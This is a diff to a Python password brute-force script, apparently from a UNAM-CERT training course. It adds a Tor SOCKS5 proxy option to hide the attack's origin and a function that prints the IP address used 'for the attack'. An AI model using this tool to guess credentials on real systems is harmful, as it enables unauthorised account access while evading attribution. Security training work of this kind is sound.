@@ -3,8 +3,11 @@
 #UNAM-CERT
 import sys
 import optparse
+import socks
+import socket
 from requests import get
 from requests.exceptions import ConnectionError
+from urllib2 import urlopen
 
 usuarios = []
 contrasenas = []
@@ -22,7 +25,7 @@ def addOptions():
     parser.add_option('-r','--report', dest='report', default=None, help='File where the results will be reported.')
     parser.add_option('-U', '--user', dest='user', default=None, help='User that will be tested during the attack.')
     parser.add_option('-P', '--password', dest='password', default=None, help='Password that will be tested during the attack.')
-
+    parser.add_option('-T', '--tor', dest='tor', default=None, action="store_true", help='Make request with TOR')
 
     opts,args = parser.parse_args()
     return opts
@@ -68,6 +71,17 @@ def ataque(host, file_usuarios, file_pass):
             makeRequest(host, m, n)
 
 
+def tor(options):
+    if options.tor != None:
+       socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
+       socket.socket = socks.socksocket
+    else:
+       pass
+
+def myip():
+    my_ip = urlopen('http://ip.42.pl/raw').read()
+    print 'La ip utilizada para el ataque es', my_ip
+
 
 
 if __name__ == '__main__':
@@ -75,8 +89,13 @@ if __name__ == '__main__':
         opts = addOptions()
         checkOptions(opts)
         url = buildURL(opts.server, port = opts.port)
+        tor(opts)
+#        opener = urllib2.build_opener()
+#        opener.addheaders = [('User-Agent', 'Marco Disner')]
+#        opener.open('http://%s'%(opts.server))
         ataque(url, opts.user, opts.password)
-  #      makeRequest(url, opts.user, opts.password)
+ #       makeRequest(url, opts.user, opts.password)
+        myip()
     except Exception as e:
         printError('Ocurrio un error inesperado')
         printError(e, True)
